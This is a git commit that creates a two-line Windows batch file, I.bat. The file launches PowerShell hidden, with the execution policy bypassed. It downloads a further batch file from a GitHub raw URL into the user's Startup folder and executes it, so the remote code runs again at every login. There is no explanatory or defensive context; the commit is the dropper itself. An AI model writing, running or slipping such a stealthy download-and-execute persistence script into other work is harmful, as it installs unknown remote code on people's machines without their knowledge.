0c901b01ebb3e0e523776bf6daa21121436c0f99
xxNighthoodxx <87844789+xxNighthoodxx@users.noreply.github.com>
2023-01-26 13:57:43 +0530

    Create I.bat

---
+++ I.bat
@@ -0,0 +1,2 @@
+@echo off
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass "Invoke-WebRequest https://raw.githubusercontent.com/xxNighthoodxx/revrevbruh/main/1.bat -OutFile '%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\1.bat';" %appdata%\Microsoft\Windows\Start Menu\Programs\Startup\1.bat
